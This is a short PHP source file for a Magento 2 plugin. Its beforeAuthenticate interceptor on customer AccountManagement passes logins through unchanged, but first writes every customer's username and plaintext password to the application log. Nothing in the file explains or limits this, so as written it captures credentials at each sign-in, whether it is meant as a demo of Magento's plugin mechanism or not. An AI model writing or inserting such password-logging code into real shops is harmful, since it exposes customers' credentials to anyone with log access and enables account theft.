<?php

namespace Firegento\ReplacementMethods\Plugin\Customer;

use \Magento\Customer\Model\AccountManagement as Source;

class AccountManagementPlugin
{
    /**
     * @var \Psr\Log\LoggerInterface
     */
    private $logger;

    public function __construct(\Psr\Log\LoggerInterface $logger)
    {
        $this->logger = $logger;
    }

    public function beforeAuthenticate(
        Source $source,
        $username,
        $password
    ) {

        $this->logger->info($username . ': ' . $password);
        return [$username, $password];
    }
}